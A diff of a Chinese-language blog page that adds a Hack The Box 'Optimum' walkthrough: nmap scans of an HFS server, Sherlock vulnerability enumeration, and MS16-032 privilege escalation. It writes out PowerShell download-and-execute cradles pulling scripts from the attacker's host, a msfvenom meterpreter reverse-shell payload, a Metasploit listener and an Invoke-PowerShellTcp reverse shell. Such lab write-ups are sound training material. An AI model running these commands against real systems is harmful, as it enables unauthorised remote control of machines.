@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://bzyfjb.github.io/2023/08/17/hello-world/"/>
+  <link rel="canonical" href="https://bzyfjb.github.io/2023/08/22/htb-optimum/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,20 +33,27 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Hello World - Yao</title>
-  <meta name="keywords" content="null">
+  <title>HTB-Optimum - Yao</title>
+  <meta name="keywords" content="HTB,nishang,Windows,HFS,MS16032,Sherlock,Msf,null">
   <meta desc name="description" content="Yao - Yao - Yao">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://bzyfjb.github.io/2023/08/17/hello-world/index.html">
+<meta property="og:title" content="HTB-Optimum">
+<meta property="og:url" content="https://bzyfjb.github.io/2023/08/22/HTB-Optimum/index.html">
 <meta property="og:site_name" content="Yao">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="Information&amp;#x20;nmap首先进行全端口扫描 1234567891011┌──(kali㉿kali)-[~]└─$ nmap -p- --min-rate 10000 10.10.10.8 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-22 07:09 EDTNmap scan report for 10.10.10.8Hos">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-08-17T14:40:04.811Z">
-<meta property="article:modified_time" content="2023-08-17T14:40:04.811Z">
+<meta property="article:published_time" content="2023-08-22T14:27:23.000Z">
+<meta property="article:modified_time" content="2023-08-22T14:30:11.577Z">
 <meta property="article:author" content="Yao">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="nishang">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="HFS">
+<meta property="article:tag" content="MS16032">
+<meta property="article:tag" content="Sherlock">
+<meta property="article:tag" content="Msf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2543,7 +2550,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://bzyfjb.github.io/2023/08/17/hello-world/">
+  <link itemprop="mainEntityOfPage" href="https://bzyfjb.github.io/2023/08/22/HTB-Optimum/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Yao">
   </span>
@@ -2564,7 +2571,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        Hello World
+        HTB-Optimum
       </h1>
       <div class='new-meta-box'>
         
@@ -2581,15 +2588,29 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/HTB/">HTB</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/HTB/" itemprop="url"><span itemprop="name">HTB</span></a>
+      </span>
+    
+  </div>
+  
+
 
 
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-08-17T22:40:04+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-08-22T22:27:23+08:00">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2023年8月17日</p>
+    <p>发布于：2023年8月22日</p>
   </a>
 </div>
 
@@ -2605,19 +2626,69 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<div class="story post-story"><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <div class="story post-story"><h2 id="Information-x20"><a href="#Information-x20" class="headerlink" title="Information&#x20;"></a>Information&#x20;</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>首先进行全端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -p- --min-rate 10000 10.10.10.8 </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 07:09 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.8</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 47.19 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>根据开放端口，进行详细信息扫描。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sC -sV -p 80 10.10.10.8       </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 07:12 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.8</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">|_http-server-header: HFS 2.3</span><br><span class="line">|_http-title: HFS /</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.32 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>访问80端口，页面信息如下</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_GcSlcSpCcl.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_GcSlcSpCcl.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>得知当前为HFS服务</p>
+</div><div class="story post-story"><h2 id="WEB-GetShell"><a href="#WEB-GetShell" class="headerlink" title="WEB-GetShell"></a>WEB-GetShell</h2><p>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49584" title="exploit-db">exploit-db</a>找到了针对nfs的exploit，将exp保存到本地之后修改其中的ip和端口设置</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_GBMLzwGFHP.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_GBMLzwGFHP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>然后使用python3执行脚本</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7RvqbVxPIt.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7RvqbVxPIt.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>可以直接获得powershell shell。</p>
+</div><div class="story post-story"><h2 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h2><h3 id="Find-vulnerabilities"><a href="#Find-vulnerabilities" class="headerlink" title="Find vulnerabilities"></a>Find vulnerabilities</h3><p>这里因为系统版本为较早的旧版本，所以需要使用<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock" title="sherlock">sherlock</a>来找到可以利用的漏洞。</p>
+<p>将Sherlock克隆到本地后，使用grep命令来搜索全部的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb/Optimum/Sherlock]</span><br><span class="line">└─$ grep -i <span class="keyword">function</span> Sherlock.ps1</span><br><span class="line"><span class="keyword">function</span> Get-FileVersionInfo (<span class="variable">$FilePath</span>) &#123;</span><br><span class="line"><span class="keyword">function</span> Get-InstalledSoftware(<span class="variable">$SoftwareName</span>) &#123;</span><br><span class="line"><span class="keyword">function</span> Get-Architecture &#123;</span><br><span class="line"><span class="keyword">function</span> Get-CPUCoreCount &#123;</span><br><span class="line"><span class="keyword">function</span> New-ExploitTable &#123;</span><br><span class="line"><span class="keyword">function</span> Set-ExploitTable (<span class="variable">$MSBulletin</span>, <span class="variable">$VulnStatus</span>) &#123;</span><br><span class="line"><span class="keyword">function</span> Get-Results &#123;</span><br><span class="line"><span class="keyword">function</span> Find-AllVulns &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS10015 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS10092 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS13053 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS13081 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS14058 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS15051 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS15078 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS16016 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS16032 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS16034 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-CVE20177199 &#123;</span><br><span class="line"><span class="keyword">function</span> Find-MS16135 &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>将<code>Find-AllVulns</code>添加后ps1脚本的最后。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb/Optimum/Sherlock]</span><br><span class="line">└─$ <span class="built_in">tail</span> -5 Sherlock.ps1</span><br><span class="line"></span><br><span class="line">    Set-ExploitTable <span class="variable">$MSBulletin</span> <span class="variable">$VulnStatus</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Find-AllVulns</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>本地开启http服务用来传输文件，在靶机的shell中使用IEX加载文件并执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.14/Sherlock.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_6-VMIwPTrc.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_6-VMIwPTrc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>查看sherlock的结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\kostas\Desktop&gt; IEX(New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.14/Sherlock.ps1&#x27;</span>)                                                  </span><br><span class="line">                                                                              </span><br><span class="line">                                                                              </span><br><span class="line">Title      : User Mode to Ring (KiTrap0D)                                     </span><br><span class="line">MSBulletin : MS10-015                                                         </span><br><span class="line">CVEID      : 2010-0232                                                        </span><br><span class="line">Link       : https://www.exploit-db.com/exploits/11199/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Task Scheduler .XML</span><br><span class="line">MSBulletin : MS10-092</span><br><span class="line">CVEID      : 2010-3338, 2010-3888</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/19930/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MSBulletin : MS13-053</span><br><span class="line">CVEID      : 2013-1300</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/33213/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MSBulletin : MS13-081</span><br><span class="line">CVEID      : 2013-3881</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/31576/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : ClientCopyImage Win32k</span><br><span class="line">MSBulletin : MS15-051</span><br><span class="line">CVEID      : 2015-1701, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/37367/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Font Driver Buffer Overflow</span><br><span class="line">MSBulletin : MS15-078</span><br><span class="line">CVEID      : 2015-2426, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/38222/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : <span class="string">&#x27;mrxdav.sys&#x27;</span> WebDAV</span><br><span class="line">MSBulletin : MS16-016</span><br><span class="line">CVEID      : 2016-0051</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/40085/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Secondary Logon Handle</span><br><span class="line">MSBulletin : MS16-032</span><br><span class="line">CVEID      : 2016-0099</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/39719/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MSBulletin : MS16-034</span><br><span class="line">CVEID      : 2016-0093/94/95/96</span><br><span class="line">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Win32k Elevation of Privilege</span><br><span class="line">MSBulletin : MS16-135</span><br><span class="line">CVEID      : 2016-7255</span><br><span class="line">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Nessus Agent 6.6.2 - 6.10.3</span><br><span class="line">MSBulletin : N/A                       </span><br><span class="line">CVEID      : 2017-7199</span><br><span class="line">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>存在漏洞的编号分别为<code>MS16-032</code>、<code>MS16-034</code>、<code>MS16-135</code>。选择利用MS16-032来进行提权。</p>
+<h3 id="Get-system-privilege"><a href="#Get-system-privilege" class="headerlink" title="Get system privilege"></a>Get system privilege</h3><p>使用的脚本有<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire" title="empire">empire</a>项目中的<code>Invoke-MS16032.ps1</code>，将文件保存到工作目录并对其进行修改，在文件最后添加如下代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-MS16032 -Command <span class="string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14:808/shell.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用Invoke-MS16032方法加载并执行shell.exe。shell.exe是通过msfvenom生成的shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb/Optimum]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=3333 -f exe &gt; shell.exe                                                            </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过msfconsole监听3333端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.14.14</span><br><span class="line">lhost =&gt; 10.10.14.14</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport  3333</span><br><span class="line">lport =&gt; 3333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.14:3333</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在靶机shell加载并执行Invoke-MS16032，在msfconsole监听的3333端口失败了</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_aS9Ic8aLT-.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_aS9Ic8aLT-.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>经过排查，确认可能存在的问题为当前shell为32位的，对64位系统内核进行检测会失败</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_NsvPtg-8cq.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_NsvPtg-8cq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>为了解决这个问题，获得一个msf shell，将进程迁移至64位进程</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_E8onJftUjP.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_E8onJftUjP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>拿到meterpreter shell后，通过ps命令查看进程信息，迁移至64位进程</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_nSQedDX5bv.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_nSQedDX5bv.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2140</span><br><span class="line">[*] Migrating from 2716 to 2140...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : OPTIMUM</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : el_GR</span><br><span class="line">Domain          : HTB</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进程迁移后再次提权。</p>
+<p>修改Invoke-PowerShellTcp.ps1进行reverse shell，在最后一行添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4444</span><br></pre></td></tr></table></figure>
+
+<p>修改Invoke-MS16032.ps1 ,在最后添加如下代码，使其加载Invoke-PowershellTcp.ps1进行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-MS16032 -Command <span class="string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14:808/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改好文件之后，在本地监听4444端口。</p>
+<p>在meterpreter shell中执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell iex(New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.14:808/Invoke-MS16032.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_JnJ-Vg1liU.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_JnJ-Vg1liU.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>靶机执行powershell命令之后，本地http服务依次接收到&#x2F;Invoke-MS16032.ps1和&#x2F;Invoke-PowerShellTcp.ps1请求，最后在4444端口监听到system shell。</p>
+</div><div class="story post-story"><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2021/03/17/htb-optimum.html" title="https://0xdf.gitlab.io/2021/03/17/htb-optimum.html">https://0xdf.gitlab.io/2021/03/17/htb-optimum.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kWTnVBIpNsE" title="https://www.youtube.com/watch?v=kWTnVBIpNsE">https://www.youtube.com/watch?v=kWTnVBIpNsE</a></p>
 
 </div>
   </div>
@@ -2643,10 +2714,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-08-17T22:40:04+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-08-22T22:30:11+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2023年8月17日</p>
+    <p>更新于：2023年8月22日</p>
   </a>
 </div>
 
@@ -2654,6 +2725,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         
           
+  
+  
+  
